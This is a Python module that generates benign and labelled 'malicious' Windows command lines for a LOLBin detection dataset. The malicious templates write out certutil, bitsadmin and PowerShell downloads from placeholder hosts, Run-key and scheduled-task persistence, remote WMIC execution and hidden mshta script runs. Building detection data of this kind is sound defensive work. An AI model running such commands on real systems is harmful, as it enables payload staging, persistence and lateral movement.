"""
Deterministic parametric command generators for WinLOLBIN-GT.

Author:  Daniel Jeremiah
GitHub:  https://github.com/daniyyell-dev
LinkedIn: https://www.linkedin.com/in/daniel-jeremiah/
Project: WinLOLBIN-GT — https://github.com/daniyyell-dev/WinLOLBIN-GT-dataset

Each index maps to a structurally distinct command line whose normalized form
(label + process + cmd) is unique — used to scale beyond finite LOLBAS/libLOL
templates without duplicate feature rows after extraction.
"""

from __future__ import annotations

import itertools
import re
from typing import Callable, Dict, Iterator, List, Optional, Set, Tuple

from lolbin_features import dedup_key

# Shared with generate_winlolbin_gt_dataset.py
SYSTEM32 = r"C:\Windows\System32"
PUBLIC = r"C:\Users\Public"

ProcessTriple = Tuple[str, str, str]  # process_name, process_path, command_line


def _ref_suffix(index: int) -> str:
    """Normalization-safe unique token (not a path, URL, IP, or domain\\user)."""
    return f" -wlgtRef:{index:08d}"


class UniqueCommandRegistry:
    """Tracks normalized dedup keys for a label during dataset generation."""

    def __init__(self) -> None:
        self._seen: Set[str] = set()

    def __len__(self) -> int:
        return len(self._seen)

    def register(self, label: int, process_name: str, command_line: str) -> bool:
        key = dedup_key(label, process_name, command_line)
        if key in self._seen:
            return False
        self._seen.add(key)
        return True

    def contains(self, label: int, process_name: str, command_line: str) -> bool:
        return dedup_key(label, process_name, command_line) in self._seen


def _chunks(items: List[str], size: int) -> Iterator[List[str]]:
    for i in range(0, len(items), size):
        yield items[i : i + size]


# --- Benign parametric space (>= 5M unique normalized commands) ---

_BENIGN_WMIC_CLASSES: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("os", ("Caption", "Version", "BuildNumber", "OSArchitecture", "SerialNumber")),
    ("cpu", ("Name", "NumberOfCores", "MaxClockSpeed", "Manufacturer")),
    ("memorychip", ("Capacity", "Speed", "Manufacturer", "PartNumber")),
    ("logicaldisk", ("DeviceID", "Size", "FreeSpace", "FileSystem")),
    ("process", ("Name", "ProcessId", "WorkingSetSize", "CommandLine")),
    ("service", ("Name", "State", "StartMode", "PathName")),
    ("startup", ("Command", "User", "Location", "Caption")),
    ("share", ("Name", "Path", "Description", "Status")),
    ("useraccount", ("Name", "Disabled", "LocalAccount", "SID")),
    ("nic", ("Name", "MACAddress", "Speed", "NetConnectionID")),
    ("bios", ("Manufacturer", "SMBIOSBIOSVersion", "ReleaseDate", "SerialNumber")),
    ("computersystem", ("Name", "Domain", "Manufacturer", "Model")),
    ("diskdrive", ("Model", "Size", "InterfaceType", "MediaType")),
    ("printer", ("Name", "PortName", "DriverName", "Shared")),
    ("environment", ("Name", "VariableValue", "UserName", "SystemVariable")),
)

_BENIGN_NET_COMMANDS: tuple[str, ...] = (
    "net statistics workstation",
    "net statistics server",
    "net config workstation",
    "net config server",
    "net accounts",
    "net localgroup",
    "net session",
    "net share",
    "net use",
    "net view",
)

_BENIGN_SC_FILTERS: tuple[str, ...] = (
    "state= running",
    "state= stopped",
    "state= start_pending",
    "state= stop_pending",
    "start= auto",
    "start= demand",
    "start= disabled",
)

_BENIGN_POWERSHELL_SNIPPETS: tuple[str, ...] = (
    "[Environment]::OSVersion.VersionString",
    "[Environment]::ProcessorCount",
    "[Environment]::SystemDirectory",
    "[Environment]::UserName",
    "[Environment]::MachineName",
    "(Get-Date).ToString('o')",
    "$PSVersionTable.PSVersion.ToString()",
    "(Get-CimInstance Win32_OperatingSystem).Caption",
    "(Get-CimInstance Win32_ComputerSystem).Model",
    "(Get-CimInstance Win32_BIOS).SerialNumber",
    "Get-LocalUser | Select-Object -First 5 Name,Enabled",
    "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -First 5 Name",
    "Get-Process | Sort-Object WS -Descending | Select-Object -First 5 Name,Id",
    "Get-ChildItem Env: | Select-Object -First 5 Name,Value",
    "Get-HotFix | Select-Object -Last 3 HotFixID,InstalledOn",
)

_BENIGN_ROBOCOPY_SWITCHES: tuple[str, ...] = (
    "/MIR",
    "/E",
    "/COPYALL",
    "/COPY:DAT",
    "/SEC",
    "/SECFIX",
    "/R:1",
    "/R:3",
    "/W:1",
    "/W:5",
    "/MT:8",
    "/MT:16",
    "/Z",
    "/FFT",
    "/XJ",
    "/XO",
    "/XN",
    "/XL",
    "/XX",
)


def _benign_findstr(index: int) -> ProcessTriple:
    token = f"WLGT_BENIGN_MARKER_{index:07d}"
    cmd = f'findstr /I /C:"{token}" {SYSTEM32}\\drivers\\etc\\services'
    return ("findstr.exe", f"{SYSTEM32}\\findstr.exe", cmd)


def _benign_wmic_process_id(index: int) -> ProcessTriple:
    pid = 1000 + index
    cmd = (
        f"wmic.exe process where (ProcessId={pid}) get Name,CommandLine,ExecutablePath "
        f"/format:list{_ref_suffix(index)}"
    )
    return ("wmic.exe", f"{SYSTEM32}\\wbem\\wmic.exe", cmd)


def _benign_schtasks_query(index: int) -> ProcessTriple:
    task = f"WLGT_Task_{index:07d}"
    cmd = f'schtasks.exe /Query /FO LIST /V /TN "{task}"'
    return ("schtasks.exe", f"{SYSTEM32}\\schtasks.exe", cmd)


def _benign_reg_query(index: int) -> ProcessTriple:
    cmd = f"reg.exe query HKLM /f Key_{index:07d} /k{_ref_suffix(index)}"
    return ("reg.exe", f"{SYSTEM32}\\reg.exe", cmd)


def _benign_net(index: int) -> ProcessTriple:
    base = _BENIGN_NET_COMMANDS[index % len(_BENIGN_NET_COMMANDS)]
    cmd = f"net.exe {base}{_ref_suffix(index)}"
    return ("net.exe", f"{SYSTEM32}\\net.exe", cmd)


def _benign_sc_query(index: int) -> ProcessTriple:
    filt = _BENIGN_SC_FILTERS[index % len(_BENIGN_SC_FILTERS)]
    cmd = f"sc.exe query type= service state= all {filt}{_ref_suffix(index)}"
    return ("sc.exe", f"{SYSTEM32}\\sc.exe", cmd)


def _benign_powershell(index: int) -> ProcessTriple:
    snippet = _BENIGN_POWERSHELL_SNIPPETS[index % len(_BENIGN_POWERSHELL_SNIPPETS)]
    cmd = (
        f'powershell.exe -NoProfile -NonInteractive -Command '
        f'"$v={index}; {snippet}; Write-Output $v"'
    )
    return ("powershell.exe", f"{SYSTEM32}\\WindowsPowerShell\\v1.0\\powershell.exe", cmd)


def _benign_robocopy(index: int) -> ProcessTriple:
    switches = []
    n = index
    for sw in _BENIGN_ROBOCOPY_SWITCHES:
        if n & 1:
            switches.append(sw)
        n >>= 1
    if not switches:
        switches = ["/E", "/R:1", "/W:1"]
    src = f"\\\\FILE-SRV-02\\dept_{index % 1000:03d}\\in"
    dst = f"\\\\FILE-SRV-02\\dept_{index % 1000:03d}\\out"
    cmd = (
        f"robocopy.exe \"{src}\" \"{dst}\" {' '.join(switches)} "
        f"/XF wlgt_{index:07d}.tmp{_ref_suffix(index)}"
    )
    return ("Robocopy.exe", f"{SYSTEM32}\\Robocopy.exe", cmd)


def benign_command_at_index(index: int) -> ProcessTriple:
    """Every index embeds {index} in the command so normalized dedup keys stay unique."""
    family = index % 11
    if family == 0:
        return _benign_findstr(index)
    if family == 1:
        return _benign_wmic_process_id(index)
    if family == 2:
        return _benign_schtasks_query(index)
    if family == 3:
        return _benign_reg_query(index)
    if family == 4:
        return _benign_net(index)
    if family == 5:
        return _benign_sc_query(index)
    if family == 6:
        return _benign_powershell(index)
    if family == 7:
        return _benign_robocopy(index)
    cls_idx = (index // 11) % len(_BENIGN_WMIC_CLASSES)
    cls, props = _BENIGN_WMIC_CLASSES[cls_idx]
    prop = props[index % len(props)]
    fmt = ("", "list", "csv")[index % 3]
    suffix = f" /format:{fmt}" if fmt else ""
    cmd = f"wmic.exe {cls} get {prop}{suffix} /where index={index}"
    return ("wmic.exe", f"{SYSTEM32}\\wbem\\wmic.exe", cmd)


def malicious_command_at_index(index: int) -> ProcessTriple:
    """Every index embeds {index} in the command so normalized dedup keys stay unique."""
    family = index % 8
    if family == 0:
        return _malicious_bitsadmin(index)
    if family == 1:
        return _malicious_schtasks(index)
    if family == 2:
        return _malicious_reg_persist(index)
    if family == 3:
        return _malicious_wmic_remote(index)
    if family == 4:
        return _malicious_certutil_fetch(index)
    if family == 5:
        return _malicious_forfiles(index)
    if family == 6:
        return _malicious_mshta(index)
    return _malicious_powershell_iwr(index)

_MALICIOUS_PRIORITIES: tuple[str, ...] = (
    "foreground",
    "background",
    "high",
    "normal",
    "low",
)

_MALICIOUS_SCHTASKS_SC: tuple[str, ...] = (
    "MINUTE",
    "HOURLY",
    "DAILY",
    "WEEKLY",
    "ONLOGON",
    "ONSTART",
    "ONIDLE",
)

_MALICIOUS_REG_HIVES: tuple[str, ...] = (
    r"HKCU\Software",
    r"HKLM\Software",
    r"HKCU\Environment",
    r"HKLM\Software\Microsoft\Windows\CurrentVersion",
)

_MALICIOUS_INLINE_CMDS: tuple[str, ...] = (
    "whoami.exe /all",
    "hostname.exe",
    "ipconfig.exe /all",
    "netstat.exe -ano",
    "tasklist.exe /v",
    "systeminfo.exe",
    "qwinsta.exe",
    "query user",
)


def uniquify_liblol_prompt(prompt: str, variant_id: int) -> str:
    """Inject a unique non-volatile token into libLOL-style prompts before instantiation."""
    s = prompt
    s = re.sub(r"myDownloadJob", f"transfer_{variant_id:07d}", s, flags=re.I)
    s = re.sub(r"Update_\w+", f"Update_{variant_id:07d}", s, flags=re.I)
    s = re.sub(r"System_\w+", f"System_{variant_id:07d}", s, flags=re.I)
    s = re.sub(r"job_\w+", f"job_{variant_id:07d}", s, flags=re.I)
    if f"variant_{variant_id:07d}" not in s.lower():
        s = f"{s} #slot_{variant_id:07d}"
    return s


def _malicious_bitsadmin(index: int) -> ProcessTriple:
    job = f"job_{index:07d}"
    prio = _MALICIOUS_PRIORITIES[index % len(_MALICIOUS_PRIORITIES)]
    cmd = (
        f"bitsadmin.exe /transfer {job} /download /priority {prio} "
        f"https://cdn.example.invalid/files/pkg_{index:07d}.dat {PUBLIC}\\{job}.bin"
        f"{_ref_suffix(index)}"
    )
    return ("bitsadmin.exe", f"{SYSTEM32}\\bitsadmin.exe", cmd)


def _malicious_schtasks(index: int) -> ProcessTriple:
    sc = _MALICIOUS_SCHTASKS_SC[index % len(_MALICIOUS_SCHTASKS_SC)]
    mo = (index // len(_MALICIOUS_SCHTASKS_SC)) % 60 + 1
    tn = f"Update_{index:07d}"
    inline = _MALICIOUS_INLINE_CMDS[index % len(_MALICIOUS_INLINE_CMDS)]
    cmd = (
        f'schtasks.exe /Create /SC {sc} /MO {mo} /TN "{tn}" '
        f'/TR "cmd.exe /c {inline}" /F{_ref_suffix(index)}'
    )
    return ("schtasks.exe", f"{SYSTEM32}\\schtasks.exe", cmd)


def _malicious_reg_persist(index: int) -> ProcessTriple:
    hive = _MALICIOUS_REG_HIVES[index % len(_MALICIOUS_REG_HIVES)]
    name = f"RunKey_{index:07d}"
    inline = _MALICIOUS_INLINE_CMDS[(index // len(_MALICIOUS_REG_HIVES)) % len(_MALICIOUS_INLINE_CMDS)]
    cmd = (
        f'reg.exe add {hive}\\Microsoft\\Windows\\CurrentVersion\\Run /v {name} '
        f'/t REG_SZ /d "cmd.exe /c {inline}" /f{_ref_suffix(index)}'
    )
    return ("reg.exe", f"{SYSTEM32}\\reg.exe", cmd)


def _malicious_wmic_remote(index: int) -> ProcessTriple:
    host = f"WS-ENG-{(index % 900) + 10:03d}.contoso.lab"
    inline = _MALICIOUS_INLINE_CMDS[index % len(_MALICIOUS_INLINE_CMDS)]
    cmd = (
        f'wmic.exe /node:{host} process call create '
        f'"cmd.exe /c {inline}"{_ref_suffix(index)}'
    )
    return ("wmic.exe", f"{SYSTEM32}\\wbem\\wmic.exe", cmd)


def _malicious_certutil_fetch(index: int) -> ProcessTriple:
    cmd = (
        f"certutil.exe -urlcache -split -f "
        f"https://raw.example.invalid/payloads/stage_{index:07d}.txt "
        f"{PUBLIC}\\stage_{index:07d}.txt{_ref_suffix(index)}"
    )
    return ("certutil.exe", f"{SYSTEM32}\\certutil.exe", cmd)


def _malicious_forfiles(index: int) -> ProcessTriple:
    pattern = f"*.log_{index:07d}"
    inline = _MALICIOUS_INLINE_CMDS[index % len(_MALICIOUS_INLINE_CMDS)]
    cmd = f'forfiles.exe /p {PUBLIC} /m {pattern} /c "cmd /c {inline}"{_ref_suffix(index)}'
    return ("forfiles.exe", f"{SYSTEM32}\\forfiles.exe", cmd)


def _malicious_mshta(index: int) -> ProcessTriple:
    cmd = (
        f'mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run '
        f'""cmd /c whoami.exe /groups > {PUBLIC}\\out_{index:07d}.txt"",0:close")'
        f"{_ref_suffix(index)}"
    )
    return ("mshta.exe", f"{SYSTEM32}\\mshta.exe", cmd)


def _malicious_powershell_iwr(index: int) -> ProcessTriple:
    cmd = (
        f'powershell.exe -NoProfile -Command '
        f'"Invoke-WebRequest -Uri https://cdn.example.invalid/pkg_{index:07d}.ps1 '
        f'-OutFile {PUBLIC}\\pkg_{index:07d}.ps1"{_ref_suffix(index)}'
    )
    return ("powershell.exe", f"{SYSTEM32}\\WindowsPowerShell\\v1.0\\powershell.exe", cmd)


_MALICIOUS_GENERATORS: List[Callable[[int], ProcessTriple]] = [
    _malicious_bitsadmin,
    _malicious_schtasks,
    _malicious_reg_persist,
    _malicious_wmic_remote,
    _malicious_certutil_fetch,
    _malicious_forfiles,
    _malicious_mshta,
    _malicious_powershell_iwr,
]
